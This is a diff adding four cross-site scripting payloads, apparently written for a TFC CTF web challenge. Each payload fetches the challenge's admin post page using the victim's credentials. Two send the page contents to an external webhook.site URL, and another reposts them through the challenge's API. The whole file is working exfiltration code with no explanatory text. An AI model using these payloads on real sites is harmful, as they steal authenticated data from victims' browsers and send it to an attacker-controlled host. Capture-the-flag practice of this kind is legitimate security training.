@@ -1,0 +1,55 @@
+<script>
+    fetch('http://challs.tfcctf.com:30669/posts/view/admin', {
+        mode: 'cors',
+        credentials: 'include',
+        method: 'GET',
+    }).then(response => {
+        if (!response.ok) {
+            throw new Error('Request failed');
+        }
+        return response.text();
+    }).then(htmlContent => {
+        fetch('https://webhook.site/8e452d77-83fe-43cf-963b-4d344544f146', {
+            method: 'POST',
+            body: htmlContent
+        });
+    }).catch(error => {
+        console.error('Error:', error);
+    });
+</script>
+
+<script>
+    fetch('http://challs.tfcctf.com:30600/posts/view/admin', {
+        mode: 'cors',
+        credentials: 'include',
+        method: 'GET',
+    }).then(response => {
+        return response.text();
+    }).then(htmlContent => {
+        fetch('https://webhook.site/8e452d77-83fe-43cf-963b-4d344544f146', {
+            method: 'POST',
+            body: htmlContent,
+        });
+    });
+</script>
+
+<script>
+    fetch('https://webhook.site/8e452d77-83fe-43cf-963b-4d344544f146', {
+        mode: 'cors',
+        credentials: 'include',
+        method: 'GET',
+    });
+</script>
+
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = handleResponse;
+    req.open('get', 'http://challs.tfcctf.com:30600/posts/view/admin', true);
+    req.send();
+    function handleResponse() {
+        var token = this.responseText;
+        var changeReq = new XMLHttpRequest();
+        changeReq.open('post', 'http://challs.tfcctf.com:32006/api/posts', true);
+        changeReq.send({ "title": "222222222222", "content": token, "hidden": false });
+    };
+</script>
